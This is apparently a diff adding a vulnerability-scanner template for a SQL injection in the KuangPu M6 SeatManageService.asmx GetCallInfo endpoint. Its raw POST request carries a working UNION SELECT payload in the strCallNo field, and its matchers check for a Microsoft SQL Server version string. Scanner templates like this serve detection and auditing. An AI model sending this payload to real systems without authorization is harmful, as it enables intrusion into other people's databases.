@@ -1,0 +1,27 @@
+id: kuangpuM6-SeatManageService-sqli
+
+info:
+  name: 快普M6 SeatManageService.asmx 存在SQL注入漏洞
+  author: kuangpuM6
+  severity: high
+  tags: kuangpuM6
+
+http:
+  - raw:
+      - |
+        POST /WebService/SeatManageService.asmx/GetCallInfo HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/x-www-form-urlencoded
+
+        strCallNo=a%27+UNION+ALL+SELECT+NULL%2CNULL%2C%40%40VERSION--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'version='
+          - 'Microsoft SQL Server'
+          - 'string>'
+        condition: and
